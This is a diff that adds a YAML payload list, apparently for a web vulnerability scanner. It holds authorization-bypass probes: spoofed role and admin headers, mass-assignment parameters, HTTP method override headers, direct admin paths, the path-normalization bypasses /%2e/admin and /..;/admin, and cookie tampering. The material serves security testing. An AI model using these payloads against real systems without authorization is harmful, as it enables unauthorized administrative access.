@@ -1,0 +1,301 @@
+defaults:
+  vuln_type: authz
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Role Escalation Headers
+  # ============================================================
+  - technique: privilege_escalation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Role: admin"
+    notes: "Header-based role override. Add X-Role header to test if backend trusts client-supplied role claims without server-side validation."
+    tags: [header, role, escalation]
+
+  - technique: privilege_escalation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Admin: true"
+    notes: "Header-based admin flag. Add X-Admin header to test if backend grants admin access via trusted header."
+    tags: [header, admin, flag]
+
+  - technique: privilege_escalation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-User-Role: administrator"
+    notes: "Header-based user role override. Test if X-User-Role header is trusted by backend authorization logic."
+    tags: [header, role, administrator]
+
+  - technique: privilege_escalation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Forwarded-User: admin"
+    notes: "Forwarded user header injection. Test if reverse proxy X-Forwarded-User header is trusted without validation."
+    tags: [header, forwarded, proxy]
+
+  - technique: privilege_escalation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Auth-User: admin"
+    notes: "Auth user header override. Test if X-Auth-User header bypasses authentication checks."
+    tags: [header, auth, user]
+
+  - technique: privilege_escalation
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Original-User: admin"
+    notes: "Original user header injection. Test if X-Original-User header from upstream proxy is trusted."
+    tags: [header, original, proxy]
+
+  # ============================================================
+  # Parameter Tampering — Query
+  # ============================================================
+  - technique: privilege_escalation
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 2
+    payload: "role=admin"
+    notes: "Query parameter role override. Append role=admin to test if authorization is derived from user-controlled query parameters."
+    tags: [query, role, tampering]
+
+  - technique: privilege_escalation
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 2
+    payload: "is_admin=true"
+    notes: "Query parameter admin flag. Append is_admin=true to test if boolean admin flag in query is trusted."
+    tags: [query, admin, boolean]
+
+  - technique: privilege_escalation
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 2
+    payload: "admin=1"
+    notes: "Query parameter admin integer flag. Append admin=1 to test if numeric admin flag is trusted."
+    tags: [query, admin, numeric]
+
+  - technique: privilege_escalation
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 2
+    payload: "access_level=admin"
+    notes: "Query parameter access level override. Append access_level=admin to test if access level is user-controllable."
+    tags: [query, access_level, tampering]
+
+  # ============================================================
+  # Parameter Tampering — JSON Body
+  # ============================================================
+  - technique: privilege_escalation
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "{\"role\":\"admin\"}"
+    notes: "JSON body role escalation. Include role field in JSON body to test mass assignment of role property."
+    tags: [json, role, mass_assignment]
+
+  - technique: privilege_escalation
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "{\"is_admin\":true}"
+    notes: "JSON body admin boolean. Include is_admin:true in JSON body to test mass assignment of admin flag."
+    tags: [json, admin, boolean]
+
+  - technique: privilege_escalation
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "{\"permissions\":[\"admin\",\"write\",\"delete\"]}"
+    notes: "JSON body permissions array escalation. Include expanded permissions array to test if permissions are assignable via request body."
+    tags: [json, permissions, array]
+
+  - technique: privilege_escalation
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "{\"user_type\":\"superadmin\"}"
+    notes: "JSON body user type escalation. Include user_type field to test if user type can be overridden via request body."
+    tags: [json, user_type, escalation]
+
+  # ============================================================
+  # Parameter Tampering — Form Body
+  # ============================================================
+  - technique: privilege_escalation
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "role=admin&is_admin=true"
+    notes: "Form body role escalation. Submit role and is_admin fields in form body to test mass assignment."
+    tags: [form, role, admin]
+
+  - technique: privilege_escalation
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "access_level=admin&permissions=all"
+    notes: "Form body access level escalation. Submit access_level and permissions fields to test authorization bypass."
+    tags: [form, access_level, permissions]
+
+  # ============================================================
+  # HTTP Method Override
+  # ============================================================
+  - technique: method_override
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-HTTP-Method-Override: PUT"
+    notes: "HTTP method override to PUT via header. Test if X-HTTP-Method-Override header bypasses method-based access controls."
+    tags: [header, method_override, put]
+
+  - technique: method_override
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-HTTP-Method-Override: DELETE"
+    notes: "HTTP method override to DELETE via header. Test if X-HTTP-Method-Override header bypasses method-based access controls."
+    tags: [header, method_override, delete]
+
+  - technique: method_override
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-Method-Override: PUT"
+    notes: "Alternative method override header. Test X-Method-Override (without HTTP prefix) for method-based bypass."
+    tags: [header, method_override, put]
+
+  - technique: method_override
+    injection_surface: header
+    evidence_type: status_diff
+    risk: 2
+    payload: "X-HTTP-Method: DELETE"
+    notes: "X-HTTP-Method override header. Test if X-HTTP-Method header is honored for method-based access controls."
+    tags: [header, method_override, delete]
+
+  # ============================================================
+  # Method Override — Query/Form
+  # ============================================================
+  - technique: method_override
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 2
+    payload: "_method=PUT"
+    notes: "Query parameter method override to PUT. Test if _method query parameter overrides HTTP method for frameworks supporting method spoofing."
+    tags: [query, method_override, put]
+
+  - technique: method_override
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 2
+    payload: "_method=DELETE"
+    notes: "Query parameter method override to DELETE. Test if _method query parameter bypasses DELETE restrictions."
+    tags: [query, method_override, delete]
+
+  - technique: method_override
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "_method=PUT"
+    notes: "Form body method override to PUT. Test if _method in form body overrides HTTP method."
+    tags: [form, method_override, put]
+
+  - technique: method_override
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 2
+    payload: "_method=DELETE"
+    notes: "Form body method override to DELETE. Test if _method in form body bypasses DELETE restrictions."
+    tags: [form, method_override, delete]
+
+  # ============================================================
+  # Path Manipulation
+  # ============================================================
+  - technique: privilege_escalation
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/admin"
+    notes: "Direct admin path access. Test if /admin endpoint is accessible without proper authorization."
+    tags: [path, admin, direct_access]
+
+  - technique: privilege_escalation
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/api/admin"
+    notes: "API admin path access. Test if /api/admin endpoint is accessible without proper authorization."
+    tags: [path, api, admin]
+
+  - technique: privilege_escalation
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/internal/"
+    notes: "Internal path access. Test if /internal/ endpoint is accessible, indicating missing path-based authorization."
+    tags: [path, internal, access]
+
+  - technique: privilege_escalation
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 2
+    payload: "/api/v1/admin/users"
+    notes: "Admin users endpoint access. Test if admin user management API is accessible without admin privileges."
+    tags: [path, admin, users, api]
+
+  - technique: privilege_escalation
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 3
+    payload: "/%2e/admin"
+    notes: "URL-encoded dot path traversal to admin. Test if path normalization bypass (/%2e/) circumvents path-based authorization."
+    tags: [path, encoding, traversal, admin]
+
+  - technique: privilege_escalation
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 3
+    payload: "/..;/admin"
+    notes: "Semicolon path traversal to admin. Test if path traversal with semicolon (Tomcat/Spring) bypasses path-based authorization."
+    tags: [path, semicolon, traversal, tomcat]
+
+  # ============================================================
+  # Cookie-Based Escalation
+  # ============================================================
+  - technique: privilege_escalation
+    injection_surface: cookie
+    evidence_type: status_diff
+    risk: 2
+    payload: "role=admin"
+    notes: "Cookie-based role escalation. Set role=admin cookie to test if authorization is derived from client-side cookie values."
+    tags: [cookie, role, escalation]
+
+  - technique: privilege_escalation
+    injection_surface: cookie
+    evidence_type: status_diff
+    risk: 2
+    payload: "is_admin=true"
+    notes: "Cookie-based admin flag. Set is_admin=true cookie to test if admin access is controlled by client-side cookie."
+    tags: [cookie, admin, boolean]
+
+  - technique: privilege_escalation
+    injection_surface: cookie
+    evidence_type: status_diff
+    risk: 2
+    payload: "user_type=administrator"
+    notes: "Cookie-based user type escalation. Set user_type=administrator cookie to test if user type is trusted from cookies."
+    tags: [cookie, user_type, administrator]
+
+  - technique: privilege_escalation
+    injection_surface: cookie
+    evidence_type: status_diff
+    risk: 2
+    payload: "access_level=9"
+    notes: "Cookie-based access level escalation. Set access_level=9 cookie to test if numeric access levels in cookies are trusted."
+    tags: [cookie, access_level, numeric]
